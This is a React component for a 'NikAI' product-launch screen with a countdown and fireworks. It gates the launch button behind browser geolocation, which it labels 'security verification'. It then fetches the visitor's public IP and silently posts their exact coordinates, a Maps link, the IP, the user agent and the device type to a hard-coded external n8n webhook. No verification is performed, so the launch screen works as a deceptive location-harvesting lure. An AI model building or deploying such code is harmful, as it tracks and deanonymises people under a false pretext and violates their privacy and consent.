import { useState } from 'react'

type Phase =
  | 'idle'           // Launch button visible
  | 'requesting'     // Requesting location (spinner + caption)
  | 'denied'         // Location denied
  | 'sending'        // Sending to webhook
  | 'webhookError'   // Webhook failed
  | 'counting'       // Countdown 3…2…1
  | 'launched'       // Congratulations screen

function getDeviceType(): 'Mobile' | 'Tablet' | 'Desktop' {
  const ua = navigator.userAgent
  if (/tablet|ipad|playbook|silk/i.test(ua)) return 'Tablet'
  if (/mobile|android|iphone|ipod|blackberry|windows phone/i.test(ua)) return 'Mobile'
  return 'Desktop'
}

const WEBHOOK_URL =
  'https://n8n.srv1296860.hstgr.cloud/webhook/4936c7c1-df78-4de5-92ae-b0fddc8aaa7f'
const IP_API = 'https://api.ipify.org?format=json'

export default function LaunchScreen({ onLaunched }: { onLaunched: () => void }) {
  const [phase, setPhase] = useState<Phase>('idle')
  const [caption, setCaption] = useState('')
  const [count, setCount] = useState(3)
  const [errorMsg, setErrorMsg] = useState('')

  /* ─── Main handler ─── */
  const handleLaunch = async () => {
    const deviceType = getDeviceType()

    /* 1. Request location */
    setPhase('requesting')
    setCaption(`Requesting live location access from this ${deviceType} for security verification…`)

    let coords: GeolocationCoordinates
    try {
      const pos = await new Promise<GeolocationPosition>((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 15000 })
      )
      coords = pos.coords
    } catch {
      setPhase('denied')
      return
    }

    /* 2. Update caption */
    setCaption(`Live location access granted from this ${deviceType}`)

    /* 3. Fetch public IP */
    let ip = 'unknown'
    try {
      const r = await fetch(IP_API)
      const d = await r.json()
      ip = d.ip
    } catch { /* silent */ }

    /* 4. Build payload */
    const lat = coords.latitude
    const long = coords.longitude
    const maps_url = `https://www.google.com/maps?q=${lat},${long}`
    const payload = {
      lat,
      long,
      maps_url,
      ip,
      user_agent: navigator.userAgent,
      device_type: deviceType,
      timestamp: new Date().toISOString(),
    }

    /* 5. Send to webhook */
    setPhase('sending')
    try {
      const res = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
      if (!res.ok) throw new Error(`HTTP ${res.status}`)
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err)
      setErrorMsg(`Security verification failed: ${msg}. Please try again.`)
      setPhase('webhookError')
      return
    }

    /* 6. Countdown */
    setPhase('counting')
    setCount(3)
    let c = 3
    const interval = setInterval(() => {
      c--
      setCount(c)
      if (c === 0) {
        clearInterval(interval)
        setPhase('launched')
        spawnFireworks()
        localStorage.setItem('nikai_launched', 'true')
        setTimeout(() => onLaunched(), 4000)
      }
    }, 800)
  }

  /* ─── Fireworks ─── */
  const spawnFireworks = () => {
    const colors = ['#E040FB','#9C6FE4','#4AE68A','#F5A623','#FF6B6B','#00BFFF','#FFD700','#FF69B4','#fff']
    for (let burst = 0; burst < 8; burst++) {
      setTimeout(() => {
        const x = 10 + Math.random() * 80
        const y = 10 + Math.random() * 60
        for (let p = 0; p < 20; p++) {
          const el = document.createElement('div')
          const angle = (p / 20) * 360
          const distance = 80 + Math.random() * 120
          const size = 4 + Math.random() * 6
          const color = colors[Math.floor(Math.random() * colors.length)]
          const duration = 0.8 + Math.random() * 0.6
          el.style.cssText = `
            position:fixed;left:${x}vw;top:${y}vh;
            width:${size}px;height:${size}px;
            background:${color};border-radius:${Math.random()>0.4?'50%':'2px'};
            z-index:9999;pointer-events:none;
            box-shadow:0 0 6px ${color};
            animation:firework ${duration}s ease-out forwards;
            --tx:${Math.cos(angle*Math.PI/180)*distance}px;
            --ty:${Math.sin(angle*Math.PI/180)*distance}px;`
          document.body.appendChild(el)
          setTimeout(() => el.remove(), duration * 1000 + 100)
        }
      }, burst * 300)
    }
    for (let i = 0; i < 150; i++) {
      setTimeout(() => {
        const el = document.createElement('div')
        const size = 5 + Math.random() * 8
        const color = colors[Math.floor(Math.random() * colors.length)]
        el.style.cssText = `
          position:fixed;left:${Math.random()*100}vw;top:-20px;
          width:${size}px;height:${size}px;
          background:${color};border-radius:${Math.random()>0.5?'50%':'2px'};
          z-index:9998;pointer-events:none;
          animation:confettiFall ${2+Math.random()*3}s linear forwards;`
        document.body.appendChild(el)
        setTimeout(() => el.remove(), 5000)
      }, i * 30)
    }
  }

  /* ─── Global CSS injected once ─── */
  const globalStyles = `
    @keyframes buttonPulse {
      0%,100% { box-shadow: 0 0 60px rgba(224,64,251,0.4), 0 20px 60px rgba(224,64,251,0.3); }
      50%      { box-shadow: 0 0 80px rgba(224,64,251,0.6), 0 20px 80px rgba(224,64,251,0.4); }
    }
    @keyframes firework {
      0%   { transform: translate(0,0) scale(1); opacity: 1; }
      100% { transform: translate(var(--tx),var(--ty)) scale(0); opacity: 0; }
    }
    @keyframes confettiFall {
      0%   { transform: translateY(-20px) rotate(0deg); opacity: 1; }
      100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
    }
    @keyframes rocketLaunch {
      0%   { transform: translateY(40px) scale(0.5); opacity: 0; }
      60%  { transform: translateY(-20px) scale(1.2); opacity: 1; }
      100% { transform: translateY(0px) scale(1); opacity: 1; }
    }
    @keyframes fadeSlideUp {
      from { transform: translateY(20px); opacity: 0; }
      to   { transform: translateY(0); opacity: 1; }
    }
    @keyframes countPulse {
      0%,100% { transform: scale(1); }
      50%      { transform: scale(1.1); }
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    @keyframes pulseDot {
      0%,100% { opacity: 1; transform: scale(1); }
      50%      { opacity: 0.4; transform: scale(0.7); }
    }
    @keyframes captionFade {
      from { opacity: 0; transform: translateY(8px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    @keyframes shieldPulse {
      0%,100% { box-shadow: 0 0 0 0 rgba(74,230,138,0.4); }
      50%      { box-shadow: 0 0 0 12px rgba(74,230,138,0); }
    }
  `

  /* ─── Shared background wrapper ─── */
  const bg = (children: React.ReactNode) => (
    <div style={{
      position: 'fixed', inset: 0, zIndex: 9999,
      background: '#0A0A18',
      display: 'flex', alignItems: 'center',
      justifyContent: 'center', flexDirection: 'column',
      gap: '24px', padding: '28px', textAlign: 'center'
    }}>
      {/* Ambient glow */}
      <div style={{
        position: 'fixed', inset: 0, pointerEvents: 'none',
        background: `
          radial-gradient(ellipse 600px 400px at 30% 40%, rgba(224,64,251,0.08), transparent),
          radial-gradient(ellipse 500px 500px at 70% 60%, rgba(156,111,228,0.06), transparent)
        `
      }}/>
      {/* Dot grid */}
      <div style={{
        position: 'fixed', inset: 0, pointerEvents: 'none',
        backgroundImage: 'radial-gradient(circle, rgba(156,111,228,0.1) 1px, transparent 1px)',
        backgroundSize: '28px 28px'
      }}/>
      <style>{globalStyles}</style>
      {children}
    </div>
  )

  /* ─── LAUNCHED screen ─── */
  if (phase === 'launched') return bg(
    <div style={{ position: 'relative', zIndex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '20px' }}>
      <div style={{ fontSize: '80px', animation: 'rocketLaunch 1s ease forwards' }}>🚀</div>
      <div style={{
        fontFamily: 'Syne, sans-serif', fontSize: 'clamp(28px,6vw,48px)', fontWeight: 800,
        background: 'linear-gradient(135deg,#E040FB,#9C6FE4,#4AE68A)',
        WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent',
        animation: 'fadeSlideUp 0.6s ease 0.3s both'
      }}>Congratulations! 🎉</div>
      <div style={{
        fontFamily: 'Syne, sans-serif', fontSize: 'clamp(18px,4vw,28px)', fontWeight: 700,
        color: '#F2F2FF', animation: 'fadeSlideUp 0.6s ease 0.5s both'
      }}>NikAI is officially LIVE! ✨</div>
      <div style={{ fontSize:'15px', color:'#7A7A99', maxWidth:'400px', lineHeight:1.8, animation:'fadeSlideUp 0.6s ease 0.7s both' }}>
        Your AI is now running and ready to handle clinic operations automatically — 24/7.
      </div>
      <div style={{ display:'flex', gap:'8px', fontSize:'28px', animation:'fadeSlideUp 0.6s ease 0.9s both' }}>
        🎊 🎉 🚀 🎊 🎉
      </div>
    </div>
  )

  /* ─── COUNTDOWN screen ─── */
  if (phase === 'counting') return bg(
    <div style={{ position: 'relative', zIndex: 1 }}>
      <div style={{
        fontFamily: 'Syne, sans-serif', fontSize: 'clamp(80px,20vw,160px)', fontWeight: 800,
        background: 'linear-gradient(135deg,#E040FB,#9C6FE4)',
        WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent',
        animation: 'countPulse 0.8s ease infinite', lineHeight: 1
      }}>{count === 0 ? '🚀' : count}</div>
      <div style={{ fontSize:'16px', color:'#7A7A99', letterSpacing:'3px', textTransform:'uppercase', fontFamily:'DM Sans, sans-serif', marginTop:'12px' }}>
        {count > 0 ? 'Launching NikAI...' : 'LIFT OFF!'}
      </div>
    </div>
  )

  /* ─── LOCATION DENIED screen ─── */
  if (phase === 'denied') return bg(
    <div style={{ position:'relative', zIndex:1, display:'flex', flexDirection:'column', alignItems:'center', gap:'20px' }}>
      <div style={{ fontSize: '56px' }}>🔒</div>
      <div style={{
        fontFamily: 'Syne, sans-serif', fontSize: 'clamp(18px,4vw,26px)', fontWeight: 700, color: '#FF6B6B',
        animation: 'fadeSlideUp 0.5s ease both'
      }}>Location Access Required</div>
      <div style={{
        fontSize: '15px', color: '#7A7A99', maxWidth: '380px', lineHeight: 1.8,
        animation: 'fadeSlideUp 0.5s ease 0.1s both'
      }}>
        Location access is required for security verification. Please enable location permissions in your browser settings and try again.
      </div>
      <button
        onClick={() => { setPhase('idle'); setErrorMsg('') }}
        style={{
          marginTop: '8px',
          padding: '14px 40px',
          background: 'rgba(255,107,107,0.15)',
          border: '1px solid rgba(255,107,107,0.4)',
          borderRadius: '100px',
          color: '#FF6B6B',
          fontSize: '15px', fontWeight: 700,
          fontFamily: 'Syne, sans-serif',
          cursor: 'pointer',
          transition: 'all 0.2s',
          animation: 'fadeSlideUp 0.5s ease 0.2s both'
        }}
        onMouseEnter={e => { e.currentTarget.style.background = 'rgba(255,107,107,0.25)' }}
        onMouseLeave={e => { e.currentTarget.style.background = 'rgba(255,107,107,0.15)' }}
      >↩ Try Again</button>
    </div>
  )

  /* ─── WEBHOOK ERROR screen ─── */
  if (phase === 'webhookError') return bg(
    <div style={{ position:'relative', zIndex:1, display:'flex', flexDirection:'column', alignItems:'center', gap:'20px' }}>
      <div style={{ fontSize: '56px' }}>⚠️</div>
      <div style={{
        fontFamily: 'Syne, sans-serif', fontSize: 'clamp(18px,4vw,24px)', fontWeight: 700, color: '#F5A623',
        animation: 'fadeSlideUp 0.5s ease both'
      }}>Verification Failed</div>
      <div style={{
        fontSize: '14px', color: '#7A7A99', maxWidth: '380px', lineHeight: 1.8,
        animation: 'fadeSlideUp 0.5s ease 0.1s both'
      }}>{errorMsg}</div>
      <button
        onClick={() => { setPhase('idle'); setErrorMsg('') }}
        style={{
          marginTop: '8px', padding: '14px 40px',
          background: 'rgba(245,166,35,0.15)',
          border: '1px solid rgba(245,166,35,0.4)',
          borderRadius: '100px', color: '#F5A623',
          fontSize: '15px', fontWeight: 700,
          fontFamily: 'Syne, sans-serif', cursor: 'pointer',
          transition: 'all 0.2s',
          animation: 'fadeSlideUp 0.5s ease 0.2s both'
        }}
        onMouseEnter={e => { e.currentTarget.style.background = 'rgba(245,166,35,0.25)' }}
        onMouseLeave={e => { e.currentTarget.style.background = 'rgba(245,166,35,0.15)' }}
      >↩ Try Again</button>
    </div>
  )

  /* ─── REQUESTING / SENDING (loading) ─── */
  if (phase === 'requesting' || phase === 'sending') return bg(
    <div style={{ position:'relative', zIndex:1, display:'flex', flexDirection:'column', alignItems:'center', gap:'28px' }}>
      {/* Spinner ring */}
      <div style={{ position:'relative', width:'88px', height:'88px' }}>
        <div style={{
          position:'absolute', inset:0,
          border: '3px solid rgba(156,111,228,0.15)',
          borderTop: '3px solid #9C6FE4',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite'
        }}/>
        <div style={{
          position:'absolute', inset:'18px',
          background: 'linear-gradient(135deg,#E040FB22,#9C6FE422)',
          borderRadius:'50%',
          display:'flex', alignItems:'center', justifyContent:'center',
          fontSize:'24px'
        }}>
          {phase === 'sending' ? '📡' : '📍'}
        </div>
      </div>

      {/* Shield badge */}
      <div style={{
        display:'flex', alignItems:'center', gap:'8px',
        padding:'8px 20px',
        background:'rgba(74,230,138,0.08)',
        border:'1px solid rgba(74,230,138,0.25)',
        borderRadius:'100px',
        animation: 'shieldPulse 2s ease-in-out infinite'
      }}>
        <span style={{ fontSize:'14px' }}>🔐</span>
        <span style={{ fontSize:'12px', color:'#4AE68A', letterSpacing:'1.5px', textTransform:'uppercase', fontFamily:'DM Sans, sans-serif', fontWeight:600 }}>
          {phase === 'sending' ? 'Sending Verification' : 'Secure Verification'}
        </span>
      </div>

      {/* Dynamic caption */}
      <div style={{
        fontSize:'clamp(14px,3vw,17px)', color:'#C6C6E8', maxWidth:'360px',
        lineHeight:1.7, fontFamily:'DM Sans, sans-serif',
        animation:'captionFade 0.5s ease both'
      }}>{caption}</div>

      {/* Animated dots */}
      <div style={{ display:'flex', gap:'8px' }}>
        {[0,1,2].map(i => (
          <div key={i} style={{
            width:'8px', height:'8px', borderRadius:'50%',
            background:'#9C6FE4',
            animation:`pulseDot 1.2s ease-in-out ${i*0.2}s infinite`
          }}/>
        ))}
      </div>

      {phase === 'sending' && (
        <div style={{ fontSize:'13px', color:'rgba(122,122,153,0.6)', fontFamily:'DM Sans, sans-serif' }}>
          Verifying with security server…
        </div>
      )}
    </div>
  )

  /* ─── IDLE — Launch button screen ─── */
  return bg(
    <div style={{ position:'relative', zIndex:1 }}>
      {/* Logo */}
      <div style={{
        fontFamily:'Syne, sans-serif', fontSize:'clamp(36px,8vw,56px)', fontWeight:800,
        background:'linear-gradient(135deg,#E040FB,#9C6FE4)',
        WebkitBackgroundClip:'text', WebkitTextFillColor:'transparent',
        marginBottom:'8px'
      }}>NikAI</div>

      <div style={{
        fontSize:'13px', color:'#7A7A99',
        letterSpacing:'2px', textTransform:'uppercase',
        marginBottom:'48px'
      }}>AI that runs your operations</div>

      {/* Security badge */}
      <div style={{
        display:'inline-flex', alignItems:'center', gap:'8px',
        padding:'7px 18px',
        background:'rgba(74,230,138,0.07)',
        border:'1px solid rgba(74,230,138,0.2)',
        borderRadius:'100px',
        marginBottom:'36px'
      }}>
        <span style={{ fontSize:'13px' }}>🔐</span>
        <span style={{ fontSize:'11px', color:'#4AE68A', letterSpacing:'1.5px', textTransform:'uppercase', fontFamily:'DM Sans, sans-serif', fontWeight:600 }}>
          Secure Location Verification
        </span>
      </div>

      {/* Launch button */}
      <div>
        <button
          onClick={handleLaunch}
          style={{
            display:'block', position:'relative',
            padding:'clamp(18px,4vw,24px) clamp(40px,8vw,72px)',
            background:'linear-gradient(135deg,#E040FB,#9C6FE4)',
            border:'none', borderRadius:'100px',
            color:'#fff', fontSize:'clamp(18px,4vw,24px)',
            fontWeight:800, fontFamily:'Syne, sans-serif',
            cursor:'pointer', letterSpacing:'1px',
            boxShadow:`
              0 0 60px rgba(224,64,251,0.4),
              0 20px 60px rgba(224,64,251,0.3),
              inset 0 1px 0 rgba(255,255,255,0.2)
            `,
            transition:'all 0.2s',
            animation:'buttonPulse 2s ease-in-out infinite'
          }}
          onMouseEnter={e => {
            e.currentTarget.style.transform='scale(1.05)'
            e.currentTarget.style.boxShadow='0 0 80px rgba(224,64,251,0.6),0 24px 80px rgba(224,64,251,0.4),inset 0 1px 0 rgba(255,255,255,0.2)'
          }}
          onMouseLeave={e => {
            e.currentTarget.style.transform='scale(1)'
            e.currentTarget.style.boxShadow='0 0 60px rgba(224,64,251,0.4),0 20px 60px rgba(224,64,251,0.3),inset 0 1px 0 rgba(255,255,255,0.2)'
          }}
          onMouseDown={e => { e.currentTarget.style.transform='scale(0.97)' }}
          onMouseUp={e => { e.currentTarget.style.transform='scale(1.05)' }}
        >
          🚀 Launch NikAI
        </button>

        <div style={{ fontSize:'12px', color:'rgba(122,122,153,0.55)', marginTop:'18px', fontFamily:'DM Sans, sans-serif', lineHeight:1.6 }}>
          Location access required for security verification
        </div>
      </div>
    </div>
  )
}
